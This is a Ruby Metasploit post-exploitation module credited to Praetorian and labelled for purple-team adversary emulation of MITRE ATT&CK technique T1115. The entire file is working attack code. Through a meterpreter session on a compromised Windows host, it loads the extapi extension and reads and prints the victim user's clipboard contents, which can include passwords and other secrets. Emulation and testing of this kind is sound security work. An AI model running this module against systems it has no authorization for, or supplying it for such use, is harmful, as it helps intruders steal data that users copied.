##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Clipboard Data (T1115) Windows - Purple Team',
                      'Description'   => %q{
                        Collection:
                        Adversaries may collect data stored in the Windows clipboard from users copying information within or between applications.
                        Applications can access clipboard data by using the Windows API.
                      },
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1115' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
  end

  def run
    begin
      print_status("Grabbing the clipboard data.")
      clipboard, text = get_clipboard_data

      if not clipboard.empty? and not clipboard.nil?
        print_status(clipboard.to_s)

        if not text.nil? and not text.empty?
          print_status("Text in clipboard is: \n#{text}")
        end
      else
        print_warning("No output recorded.")
      end
      print_good("Module T1115W execution successful.")
    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1115W execution failed.")
    end
  end

  #
  # Get the contents of the clipboard
  #
  def get_clipboard_data
    raise "Module requires meterpreter session" unless session.type == 'meterpreter'

    # If system, then can't access user's clipboard (oy, that was fun to realize).
    if is_system?
      print_warning("User is SYSTEM! Clipboard will likely be empty.")
    end

    # Initialize extapi
    unless session.extapi
      vprint_status("Loading extapi...")
      begin
        session.core.use("extapi")
      rescue Errno::ENOENT # No such file error
        print_error("Cannot load extapi - is this session a Windows meterpreter session?")
        return
      end
    end

    clipboard = session.extapi.clipboard.get_data(false)
    # If the clipboard is text only (not guaranteed), this will extract the text:
    data = clipboard[clipboard.keys[0]][clipboard[clipboard.keys[0]].keys[0]]
    return clipboard, data
  end
end
